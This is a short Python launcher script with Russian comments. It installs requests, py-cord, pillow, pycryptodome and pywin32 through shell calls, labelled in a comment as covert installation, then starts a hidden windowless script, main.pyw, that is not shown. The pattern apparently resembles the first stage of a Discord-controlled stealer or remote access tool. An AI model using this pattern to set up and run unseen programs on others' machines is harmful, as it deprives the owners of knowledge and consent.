import subprocess

# Список библиотек для установки
libraries = ["requests", "py-cord", "pillow","pycryptodome","pywin32"]

# Установка библиотек скрытно
for library in libraries:
    process = subprocess.Popen(f'pip install {library}', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, error = process.communicate()
    
    # Вывод результатов установки
    print(f"Установка библиотеки {library}:")
    print("Output:", output.decode())

subprocess.Popen("start main.pyw", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
